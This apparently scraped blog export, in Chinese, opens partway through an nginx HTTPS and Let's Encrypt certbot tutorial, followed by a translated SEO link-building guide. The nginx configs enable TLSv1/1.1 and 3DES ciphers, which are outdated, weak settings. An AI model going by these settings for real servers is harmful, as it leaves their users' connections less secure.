IPv4 listen [::]:80; server_name hack.idv.tw ; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; #rewrite ^(.*) https://$host$1 permanent; return 301 https://www.itnotetk.com$request_uri; #跳轉到Https } server { listen 443 ssl http2; server_name hack.idv.tw ; ssl on; ssl_certificate /etc/letsencrypt/live/hack.idv.tw/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/hack.idv.tw/privkey.pem; client_max_body_size 256m; ssl_dhparam /etc/nginx/certs/dhparam.pem; ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_stapling on; ssl_ciphers \u0026#34;ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA\u0026#34;; ssl_prefer_server_ciphers on; #add_header Strict-Transport-Security \u0026#34;max-age=63072000; includeSubdomains; preload\u0026#34;; add_header Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains;preload\u0026#34; always; # ... Let\u0026rsquo;s Encrypt憑證只有90天 需要手動續約 1 0 1 * * * /root/certbot-auto renew --disable-hook-validation --renew-hook \u0026#34;/etc/init.d/nginx reload\u0026#34; 版本二 網路出處\nLet’s Encrypt 是一家新的證書頒發機構（Certificate Authority，簡稱 CA），其提供免費的 TLS/SSL 憑證再配合 Certbot 這個自動化工具，讓一般的網站可以很容易地使用 HTTPS 的安全加密網頁，設定很簡單，憑證的更新也可以自動處理。 以下我以 Ubuntu Linux 14.04 的系統為例，示範 nginx 伺服器使用 Let’s Encrypt 憑證設定 HTTPS 安全加密網頁的方法。 步驟 1 - 從 Certbot 官方網站下載 certbot-auto 指令稿，並設定其執行權限 1 2 wget https://dl.eff.org/certbot-auto chmod a+x certbot-auto certbot-auto 要放在哪裡都可以，建議一開始就找一個適合的地方放好，例如建立一個 /opt/letsencrypt 目錄，把 certbot-auto 放在這裡 1 2 mkdir /opt/letsencrypt mv certbot-auto /opt/letsencrypt/ 步驟 2 - 執行 certbot-auto ，讓它自動安裝所有相依套件 1 /opt/letsencrypt/certbot-auto 執行 certbot-auto 時，會需要輸入密碼取得 root 權限 步驟 3： 安裝完成所有需要的系統套件後，接著我們要透過 webroot 的方式，使用既有的 nginx 網頁伺服器來向 Let’s Encrypt 取得憑證，而在認證的過程會需要在網頁根目錄中建立一個 .well-known/acme-challenge/ 目錄，讓 Let’s Encrypt 的伺服器來讀取其中的內容。 一般的 nginx 伺服器通常會設定把句點開頭的隱藏檔案都擋掉，遇到這樣的狀況就會無法進行認證，這時候可以再加一小段設定，讓 .well-known/acme-challenge/ 目錄可以被正常讀取。 1 2 3 4 5 6 location ^~ /.well-known/acme-challenge/ { # the usual settings } location ~ /\\. { deny all; } 步驟 4 - 使用 certonly 功能下載憑證 1 /opt/letsencrypt/certbot-auto certonly --webroot -w /var/www/blog.gtwang.org/ -d blog.gtwang.org -d gtwang.org 步驟 5 - 輸入自己的 Email 信箱 步驟 6 - 閱讀使用條款，選擇「Agree」繼續 步驟 7 - 下載完成後，會出現類似這樣的成功訊息 1 2 3 4 5 6 7 8 IMPORTANT NOTES: - Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/blog.gtwang.org/fullchain.pem. Your cert will expire on 2016-08-13. To obtain a new version of the certificate in the future, simply run Certbot again. - If you like Certbot, please consider supporting our work by: Donating to ISRG / Let\u0026#39;s Encrypt: https://letsencrypt.org/donate Donating to EFF: https://eff.org/donate-le 這樣就成功取得 Let’s Encrypt 的憑證了，而 nginx 用的憑證就儲存在 /etc/letsencrypt/live/blog.gtwang.org/ 目錄之下，其中 fullchain.pem 就是 nginx 需要憑證，而 privkey.pem 則是需要保護好的私鑰，關於憑證檔案的詳細說明，請參考 Certbot 的說明文件。 Certbot 還有提供另外一個 standalone 的方式來向 Let’s Encrypt 取得憑證，這種方式是由 Certbot 建立一個獨立的網頁伺服器，提供 Let’s Encrypt 讀取驗證用的資料，不過這樣的做法需要綁定 80 或 443 連接埠，所以通常還會需要暫停既有的網頁伺服器，對於一般的網站而言，會造成網站有幾秒鐘的斷線現象，所以我個人不喜歡這樣的方式。 接下來要設定 nginx 伺服器，使用這個新憑證來提供 HTTPS 的安全加密網頁。 步驟 8 - 要讓 nginx 啟用 HTTPS 安全加密網頁，只要加上 SSL 相關的幾行設定即可，其餘的設定保持不變，以下是我個人使用的 nginx 伺服器設定 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 server { # 傾聽 HTTPS 標準埠號 443 listen 443; # 同時啟用 IPv6 的 HTTPS 安全加密網頁 listen [::]:443; server_name blog.gtwang.org; root /var/www/blog.gtwang.org/; index index.php index.html index.htm; # 啟用 SSL ssl on; # 設定 SSL 憑證 ssl_certificate /etc/letsencrypt/live/blog.gtwang.org/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/blog.gtwang.org/privkey.pem; # 其他 SSL 選項 ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # omit SSLv3 because of POODLE (CVE-2014-3566) ssl_ciphers \u0026#39;ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:ECDHE-ECDSA-DES-CBC3-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:DES-CBC3-SHA:!DSS\u0026#39;; ssl_prefer_server_ciphers on; # ... } ssl_protocols 的部分記得要 把SSLv3拿掉 ，避免 POODLE 攻擊（CVE-2014-3566）。 步驟 9 - 設定好之後，檢查一下設定檔是否正確 1 service nginx configtest 步驟 10 - 確認無誤之後，重新載入設定檔 1 service nginx reload 這樣就完成 nginx 伺服器的設定了，接著就可以開啟 HTTPS 加密的網址來測試了，正常來說，使用 Google Chrome 瀏覽器開啟自己主機的 HTTPS 加密網址，應該就會顯示一個綠色的鎖頭，這樣就代表我們安裝的 SSL 憑證是有效的。 Let’s Encrypt 的憑證使用期限只有三個月，在憑證到期前的一個月可以使用 certbot-auto 來更新憑證，在實際更新之前我們可以加入 --dry-run 參數，先進行測試。 1 /opt/letsencrypt/certbot-auto renew --dry-run 若測試沒問題，就可以使用正式指令來更新 1 /opt/letsencrypt/certbot-auto renew --quiet --no-self-upgrade 而為了方便起見，可以將這個更新指令寫在 /opt/letsencrypt/renew.sh 指令稿中 1 2 #!/bin/sh /opt/letsencrypt/certbot-auto renew --quiet --no-self-upgrade --post-hook \u0026#34;service nginx reload\u0026#34; 這裡我又加上一個 --post-hook 的設定，讓憑證更新完後，可以自動重新載入 nginx 伺服器的設定，讓憑證生效。\n接著把這個 /opt/letsencrypt/renew.sh 指令稿寫進 crontab 中\n1 2 # m h dom mon dow command 30 2 * * 0 /opt/letsencrypt/renew.sh 官方的建議是這個指令可以一天執行兩次，讓伺服器的憑證隨時保持在最新的狀態，這裡我是設定讓伺服器每週日凌晨兩點半進行憑證的檢查與更新，Certbot 只有在憑證到期前一個月才會進行更新，如果憑證尚未到期，就不會更新 ","date":"2022-08-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52305205270_220313b3c4_o.png","permalink":"https://wayneblog.ga/2022-08-23/nginx-ssl-with-lets-encrypt/","title":"nginx 設定 ssl ＋ 自動續約 Let’s Encrypt 免費域名證書"},{"content":" 本文翻譯自：LINK BUILDING FOR SEO:The Definitive Guide (2022)\n這是一篇完整的 2022 年連結優化指南。\n因此，如果你想要取得權威網站的反向連結。\n你將會在這篇新指南中，享受本文可操作的技巧。\n讓我們往深入其中吧。\n第 1 章：連結優化基礎 在本章節，我將向你解答此問題：「什麼是連結建立？」\n同時，我也會向你展現為何連結建立，在 2022 年的今天仍然很重要。\n讓我們開始吧！\n什麼是連結建立？ 「連結建立」是一種打造單向超連結（又名反向連節），到另一個網站的方法。\n希望藉此改善網站的搜尋引擎能見度。\n常見的連結優化策略包含內容行銷、建立有用的工具、電子郵件推廣、破損連結優化與公共關係。\n為什麼連結這麼重要？ 若要理解它，你將需要跳上時光機，並重返早期網路時代的 Google 。\n在過去的日子，搜尋引擎如 Yahoo！與 Alta Vista 是主要支配者。\n他們排序搜尋結果的方式，100% 是基於網頁上的內容\n輸入：Google\n現今他們知名的 PageRank 演算法改變了這場遊戲。\nGoogle 不是單純分析網頁的內容，而是查看有多少人連結到該頁面。\n而他們是正確的。\n在接近 20 年以後，連結仍然是衡量網頁品質的最好方法。\n這就是為何 Google 仍然將反向連節視為排名的信號之一。\n此外，由於企鵝演萬法的更新，Google 現在專注在連結的品質（而非連結數量）\n你可能會疑惑：\n什麼是高品質的連結，具體是什麼？我又該如何打造他們？\n這就是我要在下一個章節涵蓋的內容。\n繼續往下看\u0026hellip;\n第 2 章：如何找到高品質的連結 在我們深入連結優化的逐步策略前，知道什麼是好（或壞）連結很重要。\n這樣，你可以專注在優化能改善 Google 排名的連結。\n因此，以下是如何辨認值得優化連結的方法：\n頁面權重 請問與你連結的那個網頁，在 PageRank 中是不是個有力人士？\n如果是的話，那將會讓你的排名擁有一個巨大的影響。\n事實上，從多年的測試中，我已經發現頁面權重的傳遞，將比任何其他因素更重要。\n這是因為來自一個權威性頁面的連結，將提供更多權重值（又被稱為 PageRank）給你的網站。\n（筆記：雖然 Google 並沒有公開分享關於 PageRank 的資訊，他們仍然將其視為演算法的基礎）\n你可以使用 Semrush ，輕易的察看 PageRank 的大約指標。\n只要在 Semrush 填入網址，並查看「Page Authority Score」數值。\n網站權重 一個連結的品質，同樣受到該網域的「網站權重」決定。\n普遍上來說，一個來自紐約時報的連結，將會比來自一個無名氣部落格的連結，產生還要大的影響力。\n雖然這些連結很難取得，但它們仍然值得爭取。\n同理，Semrush 一樣能派上用場。\n在工具中輸入網域名稱，並查看它的「Authority Score」數值。\n網站相關性 當我們提到連結，一個網站的權重很重要。\n但該網站的關聯性同樣重要。\n舉例來說，假設你經營一個關於「原始人減肥法」的網站。\n你想要從一個權威性的網站取得連結\u0026hellip;.像是單輪車，這樣的連結仍算數嗎？\n根據一位前 Googler 的訪談內容，結果顯示並非如此。\n:::info\n「從一個高 PageRank 頁面取得的連結，在過去通常很有價值。」\n「如今，演算法更注重該網站與你內容的關聯性。」\n「關聯性是新的 PageRank」\n:::\n大致上，你會想要從具權威性的網站取得連結，特別是該網站與你的內容，擁有相近的關聯。\n頁面上連結的位置 請問你的連結，是否內嵌在部分內容中嗎？\n或是埋在網頁的頁尾？\n事實證明，你的連結在頁面上的位置很重要。\n特別是埋藏在頁首與測攔的連結，並不如頁面正文區塊的連結有價值。\n網站底部呢？你會希望你的連結出現在網頁的主要區塊。\n連結是否由編輯方式放上的？ 不論你的連結是否出現在網頁，你應該詢問自己：\n「此連結是否由編輯方式放上去的？」\n換句話說，是否有人將自己網站與你的網站連結，單純是因為他們認為你的網站很讚？\n如果是的話，這就是一個編輯連結（editorial link）\n或是你在一個隨機網站創造帳戶，並在那邊放下一個自己網站的反向連結？\n這就不是編輯連結。\n如你所料，Google 更加重視編輯連結。\n:::info\n引言自 Google\n「以非編輯方式放上一個連結，或未經網站擁有人在網頁上的認證，又被稱為非自然連結。」\n「它可以被視為違反我們的搜尋指南」\n:::\n連結錨點文字 錨點文字是一個可被點擊的文字連結區塊。\n事實證明，Google 使用錨點文字作為排名訊號。\n舉例來說，你取得一個連到你網站的錨點文字：原始人甜點\nGoogle 看到該錨點文字，並說：\n恩\u0026hellip; 這個網站使用「原始人甜點」錨點文字，該連結導向的網頁一定是關於「原始人甜點」。\n當然，如同其他 SEO 技巧，關鍵字豐富的錨點文字已經被濫用。\n現今，建立一大堆準確描述的錨點文字，仍會被視為垃圾內容。\n簡短來說，我不推薦透過關鍵字豐富的錨點文字，用以建立反向連結。\n如果你是真的從錨點文字取得反向連結，還是值得慶祝。\n連結共現 「共現」是指文字與片語共同出現在你的連結上。\nGoogle 可能使用共線作為「子錨點文字」(baby anchor text)\n如果你這樣思考，就能理解：\n那些圍繞在連結上的文字，同樣提供該頁面的線索。\n既然如此，Google 又有什麼理由何不去使用呢？\n連結是否來自客作文章？ 幾年前，Google 站出來說：\n:::info\n「有件事已經無法繼續下去了：客座文章已經結束，他已經變得太過低廉」\n－Matt Cutts，前 Google 垃圾郵件團隊主管\n:::\n這是真的嗎？\n恩\u0026hellip;他取決於當下條件。\n以下這一些紅旗舉動，會使客座文章變得沒有價值。\n某人付費刊登文章 文章包含完全比對的錨點文字 該網站只為了發布客座文章單獨存在 該網站與你的網站不相關 但如果你在一個具權威性、關聯性的網站，發布一個令人驚艷的文章呢？\n在我的經驗，該連結可以幫助你爭取排名\nNofollow vs Dofollow 「rel=\u0026ldquo;nofollow\u0026rdquo;」是一個連結標籤，用來告訴搜尋引擎：不要將此連結當成一個網站背書。\n明顯地，當到了 SEO 領域，你會想要盡可能，取得一個正常「dofollow」連結。\n現在，你可以知道如何衡量連結品質，是時候開始建立他們。\n第 3 章：如何透過內容行銷，取得世界級的連結 內容是解鎖良好反向連結的關鍵，已經不是什麼秘密了。\n但這樣說好了：\n單純發布內容，並不會讓你取得任何連結。\n事實證明，特定類型的內容最適合取得反向連結。\n以下是四種內容類型，幫助你產生更多連結：\n一、視覺資產 它是什麼 視覺資產是：\n圖片 圖表 資訊圖 視覺導向的內容與圖表 它為什麼有用 視覺內容超級容易取得連結。\n舉例來說，當你發布一個圖片在你的網站，任何人在他們的網站分享此圖，當會讓你取得反向連結。\n這個強大的「當你分享我的圖片，請連結我的網站」關係，並不作用於任何文字基礎的內容。\n實際例子 幾年前我在自己的網站，發布了一個關於 Google 點擊率的圖表。\n直到現今，此圖已經被連結數十次（許多來自行銷領域的權威網站）\n確實，即使我使用表格呈現，仍可能取得這些連結。\n但這些連結的建立，有大部一部分（我預估 75%）是因為我以視覺方式呈現。\n事實上，我的許多連結，來自人們直接將我的視覺圖表，張貼到他們的網站上（並作為來源連回我的網站）。\n有趣的事，直到 2022 年的今天，每個月人們仍然連結此圖。\n這就是創造視覺圖表的強大之處。\n二、列點文章 它是什麼 一系列的方法、技術、原因、迷思或關於任何事情。\n它為什麼有用 列點文章將大量的價值，包裝成一份份可一口咬下的內容。\n事實上，當 BuzzSumo 分析一百萬篇文章時，他們發現這些列點文章，相較於其他形式的內容，產生更多反向連節。\n它勝過測驗、影片，甚至是資訊化圖表。\n實際例子 《2022 最新的 19 個 SEO 技巧》這個列表文章，是我最熱門的一個內容。\n沒錯，它產生一大堆分享\u0026hellip;\n以及留言\n但最重要的是，此貼文是一個連結磁鐵。\n它擁有超過 4,000 條連結。\n也因為此文章，擁有這麼多連結指向它，它取得關鍵字「SEO Techniques」的前 5 名。\n三、原創的研究與數據 它是什麼 從產業報告、調查或原創研究中，揭露最新數據的內容。\n它為什麼有用 研究與數據具有高度可連結性。\n當某人引用你的數據，它會與你連結，這些連結增加得非常快。\n實際例子 前些日子，我發布一篇大型 Google 排名因素調查。\n不用說，此貼文滿載了大量原始數據。\n這就是為什麼此貼文至今，可以累計 18,900 則反向連節，這個驚人的數字。\n如我上述提及，這些連結大多數來自人們引用我們的研究：\n四、深度完整的指南 它是什麼 一個關於某主題綜合性資源，其中包含所需要知道的一切事物。\n它為什麼有用 終極指南將驚人數量的資訊集中在一處，並使你的指南，成為該資源的首選。\n實際例子 我曾經從 email 收到人們詢問我，關於每日關鍵字研究的基本概念。\n很不幸地，關於這個非常重要的主題，那時在我的部落格中，並沒有任何內容。\n因此，我創造了一個：《SEO 關鍵字研究：終極指南》\n因為這個多章節的指南，涵蓋了其他網路資源沒有的內容。\n它已經被連結超過 37,700 次。\n現在，你已經創造出一些值得連結的內容，是時候打造一些連結。\n如何做？\n透過非常經典的電子郵件推廣。\n第 4 章：如何透過電子郵件推廣，打造強而有力的連結 如果你想要在 2022 年打造白帽連結，你需要使用電子郵件推廣。\n問題是：\n你的信件如何與部落客與記者們聯繫上，而非被丟進垃圾信件的資料夾中。\n閱讀本章節，找出方法。\n步驟一：找到「可能連結者」 如同名稱所述，可能連結者是一群可能會連結你網站的人。\n我將會在第 6 章，向你展項找出「可能連結者」的一大堆技巧。\n但現在，讓我們先使用簡單的策略，用來辨認出他們：反向工程。\n首先，在 Google 搜尋你的關鍵字。\n在第一頁搜尋結果頁，挑選一個網站連結，並放進連結分析工具（我使用Semrush 為例）\n接著，點擊側攔的「反向連節分析」，再點「反向連節」。\n這個網站會在下方，條列出全部的可能連結者。\n(你如何知道哪個網站值得鎖定、哪個網站要忽略？去查看第二章的內容)\n步驟二：找到他們的電子郵件地址 現在，你已經找出可能連結者，是時候挖出他們的電子郵件地址。\n:::danger\n進階技巧：僅在不得已的情況下，才去使用網站的聯繫表單，因為那一個黑洞\n:::\n以下是執行步驟：\n使用 Hunter.io\nHunter.io 非常適合用於聯繫小型網站與個人部落格。\n單純在工具中輸入網站\n接著，他將會向你展現，與該網域關聯的電子郵件地址。\n但如果你想要接觸大型網站呢？梳理這份清單將會非常痛苦。\n這就是為什麼，針對這些情境，我推薦 VoilaNorbert\nVoilaNorbert 藉由 VoilaNorvert.com ，你只要輸入某人的名字與工作的網域，就能成功運作，而不需輸入網址。\n這樣，你就能接觸到那些可能連結者，並讓他們把你網站連結，放到他們頁面上的。\n同時，它也會向你展現特定對象的電子郵件地址。\n步驟三：寄給他們一個客製化的內容 如果你想使電子郵件推廣規模化，你將會需要使用模板。\n使用模板的技巧在於，不要讓你的模板看起來像模板（下個步驟會解釋更多細節）\n但現在，以下是我執行最好的電子郵件模板之一\n:::info\n嗨（名稱）。\n我今天正尋找關於（某主題）的內容，偶然發現你的文章：（文章標題）\n我發現它的內容非常好！其中，我特別喜歡（他們文章的特定內容）。\n此外，我最近也在（你的主題）發布了一個新指南：（網址）。\n作為一位在撰寫關於（某主題）的人，我認為你也會喜歡它。\n我的指南同樣可能，成為你網頁上的一個不錯的延伸閱讀。\n不論如何，希望你繼續在（對方網站）提供精彩的作品。\n有空再聊。\n:::\n注意到這個範本，內含了許多客製化的資訊，卻不需花費許多力氣。\n第 5 章：黑帽連結優化的真實情況 如果沒有關於黑帽 SEO 的章節，任何連結優化的指南都不完整。\n黑帽連結優化非常容易被發現：\n如果取得反向連節的方法，與 Google 的網站指南違背，它大概就是黑帽。\n這就表示，你應該避免使用黑帽優化連結嗎？\n這個選擇取決於你。\n我個人不建議使用黑帽優化連結（風險與回報不成比例）。\n話雖如此，不論你是一位白帽或黑帽 SEO，你都需要知道 Google 給予黑帽的懲罰。\n因此，我們簡單統整它們：\nGoogle 企鵝 它是什麼： 一個懲罰演算法，用來針對使用垃圾連結建立權重的特定網站。\n例如，可疑的客座文章或文章留言處的垃圾訊息。\n如何避免它： 只有建立白帽連結能避免。\n有數據顯示，你可以藉由最小化完全匹克錨點文字，用以躲避企鵝演算法。\n(我說過錨點文字是另一個內容了，但它的關鍵在於信任)\n換句話說，躲避企鵝演算法最簡單的方式，就是避免使用可疑的連結（或錨點文字）\n手動懲罰與非自然連結 它是什麼： 一位來自 Google 公司員工的手動懲罰。\n它與企鵝演算法不同，Google 將會藉由 Google Search Console 寄給妳一封訊息。\n如何避免它： 除了 Google 以外，沒人知道自己的網站為什麼被手動懲罰。\n我的看法是有某個演算法，指出一個網站正在玩弄系統。\n因此，他們將網站過濾出來並做手動檢驗。\n可知，最好的避免方式是擁有一個非常乾淨的反向連結檔案。\n此外，不像企鵝演算法，你可以透過「禁止連結指向網站」與「申請重新審查」從手動懲罰中恢復。\n第 6 章：我最喜歡的 3 個連結優化策略（按步驟教學） 本章節不需要前言。\n以下是我用實戰經驗驗證，取得世界級反向連結的 3 個策略。\n資源頁面連結優化 首先，什麼是資源頁面？\n資源頁面是指在特定主題中，整合擁有良好內容的連結。\n以下是範例：\n因為這些頁面存在的原因，是將使用者導向適合的地方。\n因此，這是個絕佳的連結建立策略。\n以下是具體步驟：\n步驟 1：找到資源頁面 在 Google 使用這些搜尋字詞。\n他們是專門設計用來挖掘資源頁面：\n關鍵字 + inurl:links 關鍵字 + 「有幫助的資源」 關鍵字 + 「有用的資源」 關鍵字 + 「有用的連結」 步驟 2：檢視該頁面 以下是你需快速回答的問題：\n「來自這個網頁的連結，值得努力爭取嗎？」\n（提醒：使用第 2 章的技巧簡化此步驟）\n舉例來說，這個資源頁擁有一個體面的 URL 分數：12，還不錯。\n它同樣擁有一個具權威性的網站。\n而我的連結，最後將會在此網頁的主體區塊，如同勝利者般。\n步驟 3：找到最符合的內容 注意：\n你可能擁有是世界上最好的內容，但如果它與資源頁的主題不相搭呢？\n你將不會取得該連結。\n因此此步驟的目的，是要找出與你內容相符的資源頁面。\n依但你識別出內容，跳至第四步驟\n步驟 4：寄送此封經測試的模板 以下是我建議的模板：\n:::info\n標題：關於（對方網站）的問題\n\u0026ndash;\n嗨（名字）。\n今早，我在 Google 搜尋關於（主題）的內容時，看到你的優質資源頁：（網址）\n我只是想要跟你說：你的網頁幫了我很大的忙。\n如果沒有此網頁，我將永遠不會找到（該網站連結的資源）。\n有趣的事：我上個月剛發布了一個關於（主題）的指南，它是（簡短摘要）。\n如果你想查看該內容，以下是連結：（）\n此外，我的指南也可能是適合添加到你的網頁。\n不論如何，謝謝你將相關資源條列整理。\n祝你有個美好的一天！\n期待回復。\n（你的名字）\n:::\n:::danger\n如同所有外部接觸的模板，確保此模板盡可能客製化。\n你可以使用一個「看起來一點都不像模板」的模板。\n:::\n破損連結優化 「破損連結優化」一直是我最喜歡的優化策略。\n為什麼？\n透過破損連結優化，你可以替某人的網站提高價值，而非直接請求連結。\n以下是執行步驟：\n1. 安裝 Check My Links 或 LinkMiner 上述兩者工具，都能快速找到任何網頁的破損連結（透過你的 Chrome 瀏覽器）。\n我將會在接下幾分鐘，線你展示如何使用它們。\n2. 找到擁有許多外部連結的頁面 一個網頁越多連結，他們之中越有可能會產生破損連結。\n資源頁非常適用於此情況。\n因此，請盡情使用上文的搜尋字串，找出相應的資源頁。\n4. 查看破損連結 以下，是你執行在步驟一安裝的外掛的地方。\n它將會透漏該頁面的破損連結：\n4. 寄送郵件給該網站管理員，告知關於破損連結的事情 最後，讓經營該網頁的人，知道該頁的破損連結，並作為交換，讓對方連結你的網站。\n以下是我建議的模板：\n:::info\n標題：（對方網站名稱）的問題\n\u0026ndash;\n你好(姓名)，請問你還有再更新你的網站嗎？\n我在搜尋（主題）的內容時，發現你絕佳的網頁：（網頁標題或網址）\n然而，我發現有幾則連結是否已失效：\n（破損連結的網址）\n此外，我最近發布（簡短的內容描述）。\n它可能適合取代（指出特定的破損連結）。\n不論如何，希望這有幫助到你。\n謝謝\n（你的名字）\n:::\n摩天大樓技術 這部影片將手把手，帶你走過全部流程。\n{%youtube 263xIymvLl4 %}\n一旦你觀看完此影片，就是時候進入下一章節：\n非常棒的連結優化案例研究！\n第 7 章：驚人的案例研究 現在，是時候向你展現連結優化實際的例子。\n最棒的部分是，我之前從來沒有分享過這些內容。\n案例一 Julie 如何使用摩天大樓技巧，增加 194.1% 的自然搜尋流量 Julie Adams 的部落格：我們美麗的星球，曾經非常掙扎。\n確實，Julie　曾發布許多良好的內容，單在她的言詞中表示：不論我的內容有多棒，都沒有任何反向連結。\n這就是她決定使用「摩天大樓技術」的時機點。\n因此，她不再只是單純發布另一個良好內容，而是創造出驚人的事物。\n以下是例子：\n她使用電子郵件推廣去創立反向連結，而非單純創造好內容並等待被推廣。\n這使她取得從自然領域的權威網站，取得滿手的連結。\n這些白帽反向連結，使她自然搜尋增加了 194%。\n為何「摩天大樓技術」運作得如此良好？\n:::info\n根據 Julie 所說：\n「讓這件事如此成功的原因，在於建立反向連節就像與他人建立關係。」\n「人們在知道你的網站存在前，不會連結你的內容。」\n「此外，在你主動告訴他們以前，也不會知道你的網站存在。」\n:::\n說的非常好。\n案例二 破損連結優化的回報 去年，我決定執行破損連結優化的行銷活動。\n因此，我遵循在上一章節的流程。\n首先，我使用搜尋字串，以找出含有許多外部連結的網頁。\n接著，我使用 Check My Links 找出破損的連結。\n之後，我寄信給負責該內容的人，並表示自己有發現的破損連結存在。\n（仔細查看該信件有多麼客製化）\n收到對方的回應後，我寄給他們那些失效的連結，以及來自 Backlinko 的一大堆內容，用以進行 1:1 替換。\n而大多數的夥伴，都非常樂意增添我的連結：\n案例三 Matt 如何優化它的電子商務連結 讓我們面對一個事實：\n建立反向連結，對電商網站來說並不容易。\n但他仍有可能，就如同 Matt Lawry 一樣。\n如同多數電商網站擁有者，Matt 對於建立他電商網站的連結有麻煩（一個專注在禮物的澳洲網站）\n畢竟，有誰想要連結到一個 100% 產品導向的頁面。\n這讓 Matt 了解到，它可以使用內容為網站創造反向連結。\n具體來說，Matt 在它的網站創造一篇「摩天大樓」內容：《澳洲琴酒：終極指南》\n當然，Matt 並沒有坐下來並等待連結累積。\n他透過電子郵件，主動推廣自己的內容。\n因為 Matt 聯繫上正確的人（並寄給他們客製化的電子郵件），許多人願意提供連接給他的指南。\n這些連結都加強了 Matt 的電商網站，在搜尋結果頁想要爭取的關鍵字：澳洲琴酒。\n第 8 章：進階連結優化技巧 以下清單，是我為了挑選這幾年，一些進階連結優化的技巧。\n從「連結回收」輕鬆取得反向連結 每當有人在文章中提及你的品牌，他們都會連結你對吧？\n錯。\n我的意思指，他們「應該」連結你，但並非總是會發生。\n以下是我想表達的意思：\n但藉由輕推一把，多數網站擁有人都非常樂意，將提及你的部分轉成一個連結。\n你要如何發現些未含連結的提及呢？BuzzSumo 效果非常好。\n透過反向圖片搜尋，取得「額外」連結 請問你是否發布視覺資產（如資訊圖表、示意圖）？\n如果有，那現在可能有某些網站正使用你的圖片，卻沒有註明來源。\n不要嚇到。事實上，你應該慶祝。\n如同連結重新取得，一封友善的郵件可以將這些機會轉成連結。\n你可以使用 Google 以圖搜尋，找到那些使用你圖片，卻沒有添加連結的人們 :\n在下午寄送電子郵件 以下是我寄送上千封電子郵件後，從中學到的事情。\n在下午（收件者本地時間）寄送你的推廣電子郵件。\n為什麼？\n當你在早上寄送你的訊息，它將會被收件者，與其他 93 封訊息混在一起處理。\n但當你在下午寄送電子，收件夾就會少掉許多競爭者。\n我推薦 Gmail 內建的時間排成功能，幫你規畫推廣信發送時間。\n創造視覺化的概念、點子與策略 以下是來自 Backlinko 實際的作為：\n不管你相不相信，許多人都因為這張簡單片與我連結：\n為何它如此有效？\n恩\u0026hellip;我可以單純透過文字描述 APP 攻勢，但這將使我的內容比較不容易分享。\n另一方面，當你創造一個視覺圖像，你將會擁有部落客樂於分享的內容（並連結你的網站）。\n在結束前寄送試探郵件 你應該在第一封電子郵件推廣中，要求對方提供反向連結嗎？\n簡短回答：可能可以。\n你也可以透過兩階段流程，取得更好的結果。\n（Backlinko 讀者 Mike 發現測試郵件的成效，輾壓直接要求連結的方式）\n這個方法的另一個好處，可以減少你花費的時間。\n與其花費時間，客製化一封沒人閱讀的訊息，先寄送簡短試探郵件更好。\n之後，再針對你下一則訊息進行客製化。\n獲得 Podcast 的訪談 沒錯，客座文章有他的重要地位存在\n但有一個大問題：它需要花費很多時間撰寫！\n進入　Podcast　的世界。\n與其花費時間撰寫大綱、擬草稿、修改客座文章，不如單純出現在 Podcast 節目，並談論你所知道的內容。\n蹦！你就取得了反向連結。\n最好的地方是什麼？\n每個領域都有 Podcast 節目。\n以下反向連節，就是我出現在 Podcast 後建立的。\n使用「連結交集」找出可能連結者 如果某人連結給你的競爭者，他們可能也會提供連結給你對吧？\n沒錯。\n如果某人連結你的 2 位競爭者，他甚至更有可能提供連結給你。\n你如何找到這些，連結超過 1 位以上競爭者的網站。\nSemrush Backlink Gap tool 只要列出 2 到 3 位你最大的網站競爭者。\n這個絕佳的工具，將會向你顯示哪些人與他們連結。\n使用「預先策畫」的連結目標清單 不能否認：找到高品質的反向連結非常困難。\n這是個壞消息。\n好消息是，有些人已經為你預先策畫好，這些高品質的網站\u0026hellip;\n\u0026hellip;以「最佳部落格」清單的形式。\n以下是範例：\n更不用說，如果你再經營一個烘焙部落格，每一個網站清單的頁面，都將會是一個反向連結的好機會。\n你可以透過以下搜尋字詞，找到這些清單：\n最好的「主題」部落格 「主題」部落格清單。 結論 以上這就是我的 